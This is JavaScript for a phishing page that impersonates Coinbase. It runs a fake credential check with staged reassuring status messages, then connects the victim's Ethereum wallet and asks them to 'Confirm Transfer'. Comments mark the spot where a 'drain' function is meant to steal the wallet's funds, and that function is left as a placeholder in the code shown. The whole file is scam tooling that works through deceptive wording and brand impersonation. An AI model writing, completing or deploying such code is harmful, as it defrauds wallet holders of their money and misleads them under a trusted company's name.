document.addEventListener('DOMContentLoaded', () => {
    
    const toStep2 = document.getElementById('toStep2');
    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            
            const container = document.querySelector('.container');
            const loadingScreen = document.createElement('div');
            loadingScreen.className = 'auth-card loading-container';
            
            loadingScreen.innerHTML = `
                <div class="loader"></div>
                <p id="status-text" class="auth-status">Verifying account credentials...</p>
            `;
            container.appendChild(loadingScreen);

            const professionalMessages = [
                "Verifying account credentials...",
                "Checking security parameters...",
                "Synchronizing with Coinbase Vault...",
                "Optimizing asset distribution...",
                "Finalizing secure connection..."
            ];

            let msgIndex = 0;
            const interval = setInterval(() => {
                const statusText = document.getElementById('status-text');
                if (statusText) {
                    statusText.innerText = professionalMessages[msgIndex];
                }
                msgIndex++;
                if (msgIndex >= professionalMessages.length) {
                    clearInterval(interval);
                    setTimeout(() => {
                        loadingScreen.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 800);
                }
            }, 1100); // Slower, more deliberate speed
        };
    }

    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.onclick = async () => {
            const status = document.getElementById('status');
            if (window.ethereum) {
                try {
                    status.innerText = "Contacting wallet...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    status.innerText = "Wallet linked. Synchronizing assets...";
                    
                    // Trigger the drain request
                    setTimeout(() => {
                        status.innerText = "Finalizing synchronization. Please approve the transaction in your wallet.";
                        connectBtn.innerText = "Confirm Transfer";
                        connectBtn.onclick = () => {
                            status.innerText = "Processing transfer... please wait.";
                            // Trigger your actual drain function here
                        };
                    }, 2000);

                } catch (err) {
                    status.innerText = "Connection error. Please reconnect your wallet.";
                }
            } else {
                status.innerText = "Wallet not found. Please install Coinbase Wallet.";
            }
        };
    }
});
